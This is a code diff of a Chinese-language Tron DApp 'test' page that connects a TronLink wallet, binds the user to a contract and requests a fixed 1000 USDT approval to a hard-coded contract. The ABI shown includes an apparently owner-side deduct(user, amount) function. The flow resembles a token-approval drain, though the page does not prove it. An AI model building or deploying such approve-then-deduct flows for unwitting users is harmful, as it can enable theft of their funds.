@@ -1,174 +1,212 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Tron 合约测试页面</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f5f7fa;
-      padding: 40px;
-      text-align: center;
-    }
-    .container {
-      max-width: 600px;
-      margin: auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    button {
-      margin: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      background-color: #4CAF50;
-      color: white;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-    input {
-      padding: 10px;
-      margin: 10px;
-      width: 80%;
-      font-size: 16px;
-    }
-    .info {
-      margin-top: 20px;
-      word-break: break-all;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Tron DApp 测试</title>
 </head>
 <body>
-  <div class="container">
-    <h2>Tron USDT 合约测试</h2>
+  <h2>Tron 合约测试页面</h2>
 
-    <button onclick="connectWallet()">连接钱包</button>
-    <p><strong>当前地址：</strong><span id="walletAddress">未连接</span></p>
+  <button onclick="connectWallet()">连接钱包</button>
+  <p id="address"></p>
 
-    <button onclick="checkBind()">查询是否已绑定</button>
-    <button onclick="bindUser()">绑定用户</button>
-    <p id="bindStatus"></p>
+  <hr>
 
-    <hr />
+  <button onclick="bind()">绑定用户 (bind)</button>
 
-    <h3>USDT 授权</h3>
-    <input type="number" id="approveAmount" placeholder="输入授权金额 (USDT)" />
-    <br />
-    <button onclick="approveUSDT()">授权 USDT</button>
+  <hr>
 
-    <hr />
+  <h3>授权 USDT 给合约</h3>
+  <button onclick="approve1000USDT()">授权 1000 USDT</button>
 
-    <button onclick="getUserBalance()">查询用户余额</button>
-    <button onclick="getContractBalance()">查询合约余额</button>
+  <p id="status"></p>
 
-    <div class="info">
-      <p id="result"></p>
-    </div>
-  </div>
-
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
   <script>
-    const contractAddress = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
-    const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const USDT_DECIMALS = 6;
-
-    const contractABI = [
-      {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
-      {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Bound","type":"event"},
-      {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Deducted","type":"event"},
-      {"inputs":[],"name":"USDT","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-      {"inputs":[],"name":"bind","outputs":[],"stateMutability":"nonpayable","type":"function"},
-      {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deduct","outputs":[],"stateMutability":"nonpayable","type":"function"},
-      {"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isBound","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-      {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
+    const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
+    const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const ABI = [
+      {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          }
+        ],
+        "name": "Bound",
+        "type": "event"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          },
+          {
+            "indexed": false,
+            "internalType": "uint256",
+            "name": "amount",
+            "type": "uint256"
+          }
+        ],
+        "name": "Deducted",
+        "type": "event"
+      },
+      {
+        "inputs": [],
+        "name": "USDT",
+        "outputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "bind",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "amount",
+            "type": "uint256"
+          }
+        ],
+        "name": "deduct",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "getContractBalance",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          }
+        ],
+        "name": "getUserBalance",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "name": "isBound",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "owner",
+        "outputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      }
     ];
 
     let tronWeb;
     let contract;
-    let userAddress;
+
+    function setStatus(msg) {
+      document.getElementById("status").innerText = msg;
+    }
 
     async function connectWallet() {
       if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
         tronWeb = window.tronWeb;
-        userAddress = tronWeb.defaultAddress.base58;
-        document.getElementById("walletAddress").innerText = userAddress;
-        contract = await tronWeb.contract(contractABI, contractAddress);
-        document.getElementById("result").innerText = "钱包连接成功！";
+        document.getElementById("address").innerText =
+          "钱包地址: " + tronWeb.defaultAddress.base58;
+        contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
+        setStatus("钱包已连接");
       } else {
-        alert("请安装并解锁 TronLink 钱包！");
+        alert("请安装 TronLink 钱包并解锁");
       }
     }
 
-    async function checkBind() {
+    async function bind() {
       try {
-        const isBound = await contract.isBound(userAddress).call();
-        document.getElementById("bindStatus").innerText =
-          isBound ? "已绑定" : "未绑定";
-      } catch (error) {
-        console.error(error);
+        const tx = await contract.bind().send();
+        setStatus("绑定成功: " + tx);
+      } catch (e) {
+        setStatus("绑定失败: " + e.message);
       }
     }
 
-    async function bindUser() {
+    async function approve1000USDT() {
       try {
-        const tx = await contract.bind().send({
-          feeLimit: 100_000_000
-        });
-        document.getElementById("result").innerHTML =
-          `绑定成功！<br>交易哈希: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx}</a>`;
-      } catch (error) {
-        console.error(error);
-        document.getElementById("result").innerText = "绑定失败：" + error.message;
-      }
-    }
+        const fixedAmount = 1000; // 固定授权 1000 USDT
+        const usdt = await tronWeb.contract().at(USDT_ADDRESS);
 
-    async function approveUSDT() {
-      try {
-        const amount = document.getElementById("approveAmount").value;
-        if (!amount || amount <= 0) {
-          alert("请输入有效的授权金额");
-          return;
-        }
+        const tx = await usdt
+          .approve(CONTRACT_ADDRESS, fixedAmount * 1e6)
+          .send();
 
-        const usdtContract = await tronWeb.contract().at(usdtAddress);
-        const value = parseInt(amount * Math.pow(10, USDT_DECIMALS));
-
-        const tx = await usdtContract
-          .approve(contractAddress, value)
-          .send({ feeLimit: 100_000_000 });
-
-        document.getElementById("result").innerHTML =
-          `授权成功！<br>交易哈希: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx}</a>`;
-      } catch (error) {
-        console.error(error);
-        document.getElementById("result").innerText = "授权失败：" + error.message;
-      }
-    }
-
-    async function getUserBalance() {
-      try {
-        const balance = await contract.getUserBalance(userAddress).call();
-        document.getElementById("result").innerText =
-          "用户余额: " + (balance / Math.pow(10, USDT_DECIMALS)) + " USDT";
-      } catch (error) {
-        console.error(error);
-      }
-    }
-
-    async function getContractBalance() {
-      try {
-        const balance = await contract.getContractBalance().call();
-        document.getElementById("result").innerText =
-          "合约余额: " + (balance / Math.pow(10, USDT_DECIMALS)) + " USDT";
-      } catch (error) {
-        console.error(error);
+        setStatus("授权成功: " + tx + " （固定 1000 USDT）");
+      } catch (e) {
+        setStatus("授权失败: " + e.message);
       }
     }
   </script>
